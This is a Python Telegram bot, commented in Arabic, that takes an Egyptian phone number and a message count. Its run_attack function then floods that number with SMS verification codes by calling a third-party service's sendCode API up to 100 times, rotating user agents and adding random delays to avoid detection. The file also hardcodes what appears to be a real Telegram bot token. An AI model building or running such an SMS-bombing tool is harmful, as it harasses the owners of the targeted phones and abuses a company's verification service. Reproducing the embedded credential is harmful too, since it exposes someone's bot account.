import logging
import asyncio
import random
import string
import httpx

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# لا تنس وضع التوكن الآمن والجديد هنا
TOKEN = '8085909274:AAFHj_haKlG4ODD8X-Z1ARAl3OC0lFj0c3E'

# إعدادات عامة
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
# -- تم التصحيح هنا --
logger = logging.getLogger(__name__)

GET_NUMBER, GET_COUNT = range(2)
API_URL = "https://api.twistmena.com/music/Dlogin/sendCode"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
]

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
    }

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = "أهلاً بك! 🚀\n\nلبدء إرسال الرسائل، استخدم الأمر: /sms"
    await update.message.reply_text(welcome_text)

async def start_sms_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("📞 أرسل لي رقم الهاتف (11 رقمًا يبدأ بـ 01).")
    return GET_NUMBER

async def get_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    number = update.message.text
    if number.startswith("01") and len(number) == 11:
        context.user_data['phone_number'] = "2" + number
        await update.message.reply_text("🔢 ممتاز. الآن أرسل عدد الرسائل (رقم بين 1 و 100).")
        return GET_COUNT
    else:
        await update.message.reply_text("❌ رقم غير صحيح. أرسل رقمًا مصريًا صحيحًا.")
        return GET_NUMBER

async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    number = context.user_data.get('phone_number')
    sms_count = context.user_data.get('sms_count')

    await context.bot.send_message(chat_id, text=f"🚀 حسنًا! جاري البدء في إرسال {sms_count} رسالة إلى {number}...")

    success_count = 0
    failure_count = 0

    async with httpx.AsyncClient() as client:
        for i in range(sms_count):
            payload = {"dial": number, "randomValue": ''.join(random.choices(string.ascii_letters + string.digits, k=6))}
            headers = get_random_headers()
            try:
                response = await client.post(API_URL, headers=headers, json=payload, timeout=20.0)
                if response.status_code == 200:
                    success_count += 1
                else:
                    failure_count += 1
            except httpx.ConnectTimeout:
                logger.error("Connection to SMS API timed out.")
                failure_count += 1
                await context.bot.send_message(chat_id, "❌ فشل الاتصال بسيرفر الرسائل (Timed Out). قد يكون السيرفر متوقفًا. سأكمل المحاولة...")
            except Exception as e:
                logger.error(f"An unexpected error occurred: {e}")
                failure_count += 1
            
            await asyncio.sleep(random.uniform(1.0, 2.5))

    summary_text = f"📊 **اكتملت العملية** 📊\n- ✅ نجاح: `{success_count}`\n- ❌ فشل: `{failure_count}`"
    await context.bot.send_message(chat_id, text=summary_text, parse_mode='Markdown')

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        sms_count = int(update.message.text)
        if not (1 <= sms_count <= 100):
            # -- تم تصحيح المسافة البادئة هنا --
            await update.message.reply_text("❌ العدد غير مسموح به. أدخل رقمًا بين 1 و 100.")
            return GET_COUNT
        
        context.user_data['sms_count'] = sms_count
        await run_attack(update, context)
        return ConversationHandler.END
    except (ValueError, TypeError):
        await update.message.reply_text("❌ هذا ليس رقمًا صحيحًا.")
        return GET_COUNT

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("👍 تم إلغاء العملية.")
    return ConversationHandler.END
    
def main() -> None:
    application = Application.builder().token(TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("sms", start_sms_command)],
        states={
            GET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
            GET_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(conv_handler)
    print("🚀 Bot is running...")
    application.run_polling()

# -- تم التصحيح هنا --
if __name__ == "__main__":
    main()
